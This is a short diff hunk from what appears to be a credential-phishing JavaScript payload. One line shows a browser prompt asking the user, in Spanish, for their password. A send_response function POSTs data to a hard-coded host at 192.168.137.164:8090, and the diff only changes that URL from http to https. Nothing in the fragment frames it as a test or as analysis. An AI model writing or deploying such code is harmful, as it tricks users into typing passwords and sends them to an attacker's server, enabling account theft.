@@ -3,7 +3,7 @@ var pass=prompt('Para continuar inserta tu contraseña');
 
 function send_response(response){
 	var oReqX = new XMLHttpRequest();
-	oReqX.open("POST","http://192.168.137.164:8090/");
+	oReqX.open("POST","https://192.168.137.164:8090/");
 	oReqX.send(response);
 }
 
